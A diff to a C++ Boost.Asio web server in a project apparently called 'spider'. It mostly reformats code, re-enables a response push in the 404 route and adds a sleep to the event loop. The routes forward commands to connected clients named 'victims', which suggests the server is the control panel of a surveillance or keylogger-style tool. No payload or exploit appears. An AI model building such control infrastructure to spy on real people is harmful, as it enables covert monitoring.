@@ -10,53 +10,49 @@ namespace http
 {
 
 WebServer::WebServer(server::CommandCenter const &cmdCenter, volatile bool const &running, std::uint32_t port, std::vector<std::unique_ptr<::spider::server::Client>> const &clients) : AControl(cmdCenter, running, clients), m_port(port), m_routes(), m_io_service(),
-  m_acceptor(m_io_service, boost::asio::ip::tcp::endpoint(boost::asio::ip::tcp::v4(), m_port)), m_cmdCenter(cmdCenter), m_running(running), m_clientCount(0)
+                                                                                                                                                                                        m_acceptor(m_io_service, boost::asio::ip::tcp::endpoint(boost::asio::ip::tcp::v4(), m_port)), m_cmdCenter(cmdCenter), m_running(running), m_clientCount(0)
 {
   nope::log::Log(Info) << "Creating WebServer";
   nope::log::Log(Debug) << "creating default and custom routes for WebServer";
 
-  m_routes["/404"] = [&](std::uint32_t askId, std::uint32_t victimId)
-  {
-      nope::log::Log(Info) << "Someone is on 404";
-      server::Event ev;
-      ev.destId = victimId;
-      ev.emitter = this;
-      ev.askId = askId;
-      ev.commandName = "404";
-      ev.response.setResponse("404");
-      //m_responseQueue.push(ev);
+  m_routes["/404"] = [&](std::uint32_t askId, std::uint32_t victimId) {
+    nope::log::Log(Info) << "Someone is on 404";
+    server::Event ev;
+    ev.destId = victimId;
+    ev.emitter = this;
+    ev.askId = askId;
+    ev.commandName = "404";
+    ev.response.setResponse("404");
+    m_responseQueue.push(ev);
   };
 
-  m_routes["/"] = [&](std::uint32_t askId, std::uint32_t victimId)
-  {
-      nope::log::Log(Info) << "Someone requested commandsInfo";
-      server::Event ev;
-      ev.destId = victimId;
-      ev.emitter = this;
-      ev.askId = askId;
-      ev.commandName = "commandInfo";
-      ev.response.setResponse("CommandInfo");
-      m_responseQueue.push(ev);
+  m_routes["/"] = [&](std::uint32_t askId, std::uint32_t victimId) {
+    nope::log::Log(Info) << "Someone requested commandsInfo";
+    server::Event ev;
+    ev.destId = victimId;
+    ev.emitter = this;
+    ev.askId = askId;
+    ev.commandName = "commandInfo";
+    ev.response.setResponse("CommandInfo");
+    m_responseQueue.push(ev);
   };
 
-  m_routes["/nb"] = [&](std::uint32_t askId, std::uint32_t victimId)
-  {
-      nope::log::Log(Info) << "Someone requested the number of client";
-      server::Event ev;
-      ev.destId = victimId;
-      ev.emitter = this;
-      ev.askId = askId;
-      ev.commandName = "clientCount";
-      ev.response.setResponse("ClientCount");
-      m_responseQueue.push(ev);
+  m_routes["/nb"] = [&](std::uint32_t askId, std::uint32_t victimId) {
+    nope::log::Log(Info) << "Someone requested the number of client";
+    server::Event ev;
+    ev.destId = victimId;
+    ev.emitter = this;
+    ev.askId = askId;
+    ev.commandName = "clientCount";
+    ev.response.setResponse("ClientCount");
+    m_responseQueue.push(ev);
   };
 
   for (auto const &cur : m_commands)
   {
     nope::log::Log(Info) << "route: " << cur.name;
-    m_routes["/" + cur.name] = [&](std::uint32_t askId, std::uint32_t victimId)
-    {
-      std::string url ("/" + cur.name);
+    m_routes["/" + cur.name] = [&](std::uint32_t askId, std::uint32_t victimId) {
+      std::string url("/" + cur.name);
       nope::log::Log(Info) << "route for: " << url << " requested on client " << victimId;
 
       server::Event ev;
@@ -91,6 +87,8 @@ void WebServer::sendToSpider(server::Event &ev)
 
 void WebServer::run()
 {
+  using namespace std::chrono_literals;
+
   m_acceptor.listen();
   acceptClient(m_acceptor, m_io_service, m_routes, m_clientCount, m_clients);
   nope::log::Log(Info) << "WebServer started on port: " << m_port << "." << std::endl;
@@ -99,6 +97,9 @@ void WebServer::run()
     m_io_service.poll_one();
     m_io_service.reset();
     checkResponse();
+
+    // Prevent high cpu usage
+    std::this_thread::sleep_for(1ms);
   }
 }
 
@@ -155,10 +156,9 @@ void WebServer::checkResponse()
       {
         std::shared_ptr<std::string> str = std::make_shared<std::string>(ss.str());
         boost::asio::async_write(client->getSocket(), boost::asio::buffer(str->c_str(), str->length()),
-            [&client, str](boost::system::error_code const &e, std::size_t n)
-            {
-            nope::log::Log(Debug) << "wrtting on socket...";
-            });
+                                 [&client, str](boost::system::error_code const &e, std::size_t n) {
+                                   nope::log::Log(Debug) << "wrtting on socket...";
+                                 });
         nope::log::Log(Info) << "sending response to AControl's client";
         break;
       }
@@ -167,22 +167,21 @@ void WebServer::checkResponse()
 }
 
 void WebServer::acceptClient(boost::asio::ip::tcp::acceptor &acceptor, boost::asio::io_service &io_service,
-    std::map<std::string, std::function<void(std::uint32_t, std::uint32_t)>> &routes, std::uint32_t &clientCount, std::vector<std::shared_ptr<HTTPUserSession>> &clients)
+                             std::map<std::string, std::function<void(std::uint32_t, std::uint32_t)>> &routes, std::uint32_t &clientCount, std::vector<std::shared_ptr<HTTPUserSession>> &clients)
 {
   std::shared_ptr<HTTPUserSession> client = std::make_shared<HTTPUserSession>(io_service, routes, clientCount++);
   clients.push_back(client);
-  acceptor.async_accept(client->getSocket(), [client, &acceptor, &io_service, &routes, &clientCount, &clients](const boost::system::error_code &e)
-      {
-      WebServer::acceptClient(acceptor, io_service, routes, clientCount, clients);
-      if (!e)
-      {
+  acceptor.async_accept(client->getSocket(), [client, &acceptor, &io_service, &routes, &clientCount, &clients](const boost::system::error_code &e) {
+    WebServer::acceptClient(acceptor, io_service, routes, clientCount, clients);
+    if (!e)
+    {
       client->sessionStart(client);
-      }
-      else
-      {
+    }
+    else
+    {
       nope::log::Log(Error) << "cannot accept client on WebServer :/";
-      }
-      });
+    }
+  });
 }
 
 void WebServer::addRoute(std::string url, std::function<void(std::uint32_t, std::uint32_t)> x)
